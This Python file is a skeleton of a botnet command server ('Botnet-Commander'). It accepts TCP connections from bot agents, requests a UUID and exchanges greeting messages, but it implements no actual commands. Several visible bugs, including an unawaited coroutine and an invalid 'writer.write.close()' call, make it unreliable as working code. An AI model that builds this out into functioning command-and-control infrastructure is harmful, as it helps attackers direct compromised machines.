import os
import asyncio
import json
import uuid
from pathlib import Path
import time
import threading
import configparser
from logger import CoreLogger
from socket import socket, AF_INET, SOCK_STREAM


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/commander.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
        log_dir = config_parser.get("CORE", "LOG_DIR")
        log_name = config_parser.get("CORE", "LOG_NAME")
        conn_buff = int(config_parser.get("CORE", "CONN_BUFF"))
    except Exception as err:
        print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
              "exception occurred: {}".format(err))
        exit(5)
    return host, port, log_level, log_dir, log_name, conn_buff


class BotCommander:
    def __init__(self, host, port, conn_rcv):
        self.uuids = {}
        self.host = host
        self.port = port
        self.conn_rcv = conn_rcv
        self.sock = socket(AF_INET, SOCK_STREAM)
        asyncio.run(self.__run())

    async def __send_instructions(self, reader, writer):
        task = self.__identify_agent(reader, writer)
        message = "Hello"
        addr = writer.get_extra_info('peername')
        logger.core.debug(f"Sending data {message} to peer {addr}")
        writer.write(message.encode("utf-8"))

        data = await reader.read(self.conn_rcv)
        message = data.decode("utf-8")
        logger.core.debug(f"Received {message} from {addr}")

        writer.close()
        await writer.wait_closed()

    async def __run(self):
        server = await asyncio.start_server(self.__send_instructions, self.host, self.port)

        addrs = ", ".join(str(self.sock.getsockname()) for self.sock in server.sockets)
        logger.core.info(f"Server started listener on {addrs}")

        async with server:
            await server.serve_forever()

    async def __identify_agent(self, reader, writer):
        payload = self.__get_uuid_payload
        addr = writer.get_extra_info('peername')
        logger.core.info(f"Connection accepted from peer {addr}")
        logger.core.debug(f"Sending getUUID to peer {addr}")
        try:
            writer.write(b"getUUID")
        except Exception as err:
            logger.core.error(f"Unexpected exception when sending getUUID to peer {addr}: {err}")
        data = await reader.read(self.conn_rcv)
        if not data:
            logger.core.error(f"Bot-Agent {addr} has not replied with UUID, unable to add agent, closing connection")
            writer.write.close()
            # Cancel current task from the current running loop on this thread
            asyncio.current_task(asyncio.get_running_loop()).cancel()

    @staticmethod
    def __get_uuid_payload():
        return "getUUID".encode("utf-8")


if __name__ == "__main__":
    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, CONN_BUFF = load_conf()
    logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
    srv = BotCommander(HOST, PORT, CONN_BUFF)
    logger.core.info("Botnet-Commander exited")
